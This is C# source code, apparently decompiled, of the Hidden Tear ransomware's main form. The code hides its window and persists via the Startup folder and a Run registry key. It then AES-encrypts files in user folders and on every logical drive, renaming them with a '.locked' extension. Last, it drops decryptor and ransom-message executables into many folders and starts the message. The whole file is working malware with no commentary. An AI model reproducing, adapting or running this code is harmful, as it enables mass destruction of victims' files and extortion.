using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HiddenTear;

public class Form1 : Form
{
	private static byte[] passwordBytes;

	private static List<string> crypted = new List<string>();

	private IContainer components;

	public Form1()
	{
		Common.Log("File opened!");
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	private void startAction()
	{
		string text = createPassword(Settables.PASSLENGTH);
		Common.Log("password is : " + text);
		Common.Log("Sequence started!");
		byte[] buffer = File.ReadAllBytes(Assembly.GetEntryAssembly()!.Location);
		dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\HTCryptor.exe", buffer);
		addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\HTCryptor.exe");
		Common.Log("Persisted, starting encryption!");
		if (!string.IsNullOrEmpty(Settables.CONTAINMENTPATH))
		{
			encryptDirectory(Settables.CONTAINMENTPATH);
		}
		else
		{
			string[] array = new string[11]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Recent),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
			};
			foreach (string location in array)
			{
				encryptDirectory(location);
			}
			array = Directory.GetLogicalDrives();
			foreach (string location2 in array)
			{
				encryptDirectory(location2);
			}
		}
		dropFiles();
		Common.Log("Encryption completed!");
		text = null;
		Application.Exit();
	}

	private string createPassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		passwordBytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
		passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
		return stringBuilder.ToString();
	}

	private void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (Settables.EXTENTIONS.Contains(extension.ToLower()))
				{
					encryptFile(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch
		{
		}
	}

	private void encryptFile(string file)
	{
		try
		{
			try
			{
				if (Settables.Mode == ExecutionMode.Full)
				{
					byte[] bytes = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes);
					File.Move(file, file + ".locked");
					crypted.Add(file);
					return;
				}
				if (new FileInfo(file).Length <= 4096L)
				{
					byte[] bytes2 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes2);
					File.Move(file, file + ".locked");
					crypted.Add(file);
					return;
				}
				byte[] array = new byte[8192];
				using (BinaryReader binaryReader = new BinaryReader(File.Open(file, FileMode.Open)))
				{
					byte[] array2 = encryptAES(binaryReader.ReadBytes(4096), passwordBytes);
					Array.Copy(array2, array, array2.Length);
				}
				using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(file, FileMode.Open)))
				{
					binaryWriter.Write(array);
				}
				File.Move(file, file + ".locked");
				crypted.Add(file);
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(file);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(file, attributes);
				}
				if (Settables.Mode == ExecutionMode.Full)
				{
					byte[] bytes3 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes3);
					File.Move(file, file + ".locked");
					crypted.Add(file);
					return;
				}
				if (new FileInfo(file).Length <= 4096L)
				{
					byte[] bytes4 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes4);
					File.Move(file, file + ".locked");
					crypted.Add(file);
					return;
				}
				byte[] buffer = new byte[8192];
				using (BinaryReader binaryReader2 = new BinaryReader(File.Open(file, FileMode.Open)))
				{
					buffer = encryptAES(binaryReader2.ReadBytes(4096), passwordBytes);
				}
				using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(file, FileMode.Open)))
				{
					binaryWriter2.Write(buffer);
				}
				File.Move(file, file + ".locked");
				crypted.Add(file);
			}
		}
		catch
		{
		}
	}

	private byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, Settables.SALT, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private void dropFiles()
	{
		if (crypted.Count >= 1)
		{
			byte[] embeddedResource = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Decrypt.exe");
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\HTDecryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\HTDecryptor.exe", embeddedResource);
			byte[] embeddedResource2 = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Message.exe");
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\message.exe", embeddedResource2);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe", embeddedResource2);
			addToStartupRegistry("Message", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe");
			startProcess(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe");
		}
	}

	private static void dropFile(string path, byte[] buffer)
	{
		try
		{
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, buffer);
			}
		}
		catch
		{
		}
	}

	private static byte[] getEmbeddedResource(string fullName)
	{
		byte[] array = null;
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fullName);
		using MemoryStream memoryStream = new MemoryStream();
		manifestResourceStream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	private static void addToStartupRegistry(string name, string path)
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(name, "\"" + path + "\"");
		}
		catch
		{
		}
	}

	private static void startProcess(string path)
	{
		try
		{
			Process.Start(path);
		}
		catch
		{
		}
	}

	private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
	{
		return attributes & ~attributesToRemove;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(104, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Control)this).ResumeLayout(false);
	}
}
